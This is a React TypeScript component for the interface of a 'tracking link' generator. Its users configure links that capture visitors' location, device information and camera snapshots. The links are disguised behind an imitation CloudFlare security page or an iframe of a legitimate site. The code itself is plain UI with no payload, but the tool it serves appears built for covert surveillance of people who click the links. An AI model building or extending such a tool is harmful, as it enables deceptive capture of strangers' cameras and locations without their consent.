import { useState } from 'react';
import { useMutation, useQueryClient } from '@tanstack/react-query';
import { apiRequest } from '@/lib/queryClient';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Copy } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface CreateSectionProps {
  userId: string;
}

export function CreateSection({ userId }: CreateSectionProps) {
  const [originalUrl, setOriginalUrl] = useState('');
  const [campaignName, setCampaignName] = useState('');
  const [trackLocation, setTrackLocation] = useState(true);
  const [trackDevice, setTrackDevice] = useState(true);
  const [trackCamera, setTrackCamera] = useState(false);
  const [generatedLinks, setGeneratedLinks] = useState<any>(null);
  
  const { toast } = useToast();
  const queryClient = useQueryClient();

  const createLinkMutation = useMutation({
    mutationFn: async (data: any) => {
      const response = await apiRequest('POST', '/api/links', data);
      return response.json();
    },
    onSuccess: (data) => {
      setGeneratedLinks(data);
      queryClient.invalidateQueries({ queryKey: ['/api/links', userId] });
      toast({
        title: "Success",
        description: "Tracking links generated successfully",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Error",
        description: error.message || "Failed to create tracking links",
        variant: "destructive",
      });
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    createLinkMutation.mutate({
      userId,
      originalUrl,
      campaignName,
      trackLocation,
      trackDevice,
      trackCamera,
    });
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied",
        description: "Link copied to clipboard",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to copy link",
        variant: "destructive",
      });
    }
  };

  return (
    <section className="p-8">
      <div className="max-w-2xl mx-auto">
        <Card className="surface border-border">
          <CardHeader>
            <CardTitle className="text-2xl font-bold">Create New Tracking Link</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="url" className="text-slate-300">Target URL</Label>
                <Input
                  id="url"
                  type="url"
                  value={originalUrl}
                  onChange={(e) => setOriginalUrl(e.target.value)}
                  className="bg-slate-800 border-border text-slate-50"
                  placeholder="https://example.com"
                  required
                />
                <p className="text-sm text-slate-400 mt-1">
                  Enter the URL you want visitors to be redirected to
                </p>
              </div>

              <div>
                <Label htmlFor="campaign" className="text-slate-300">Campaign Name</Label>
                <Input
                  id="campaign"
                  type="text"
                  value={campaignName}
                  onChange={(e) => setCampaignName(e.target.value)}
                  className="bg-slate-800 border-border text-slate-50"
                  placeholder="My Campaign"
                />
              </div>

              <div>
                <Label className="text-slate-300 mb-3 block">Tracking Options</Label>
                <div className="space-y-3">
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="location"
                      checked={trackLocation}
                      onCheckedChange={(checked) => setTrackLocation(checked === true)}
                    />
                    <Label htmlFor="location" className="text-sm">Location tracking</Label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="device"
                      checked={trackDevice}
                      onCheckedChange={(checked) => setTrackDevice(checked === true)}
                    />
                    <Label htmlFor="device" className="text-sm">Device information</Label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="camera"
                      checked={trackCamera}
                      onCheckedChange={(checked) => setTrackCamera(checked === true)}
                    />
                    <Label htmlFor="camera" className="text-sm">Camera snapshots</Label>
                  </div>
                </div>
              </div>

              <Button
                type="submit"
                className="w-full bg-primary hover:bg-primary/90 text-white"
                disabled={createLinkMutation.isPending}
              >
                {createLinkMutation.isPending ? "Generating..." : "Generate Tracking Links"}
              </Button>
            </form>

            {generatedLinks && (
              <div className="mt-8">
                <h3 className="text-lg font-semibold mb-4">Your Tracking Links</h3>
                <div className="space-y-4">
                  <div className="bg-slate-800 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="font-medium text-accent">CloudFlare Method</h4>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(generatedLinks.cloudflareUrl)}
                      >
                        <Copy size={16} />
                      </Button>
                    </div>
                    <code className="text-sm text-slate-300 font-mono block bg-slate-900 p-2 rounded break-all">
                      {generatedLinks.cloudflareUrl}
                    </code>
                    <p className="text-xs text-slate-400 mt-2">
                      Shows CloudFlare security page before redirecting
                    </p>
                  </div>

                  <div className="bg-slate-800 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="font-medium text-secondary">WebView Method</h4>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(generatedLinks.webviewUrl)}
                      >
                        <Copy size={16} />
                      </Button>
                    </div>
                    <code className="text-sm text-slate-300 font-mono block bg-slate-900 p-2 rounded break-all">
                      {generatedLinks.webviewUrl}
                    </code>
                    <p className="text-xs text-slate-400 mt-2">
                      Embeds target site in iframe for seamless tracking
                    </p>
                  </div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </section>
  );
}
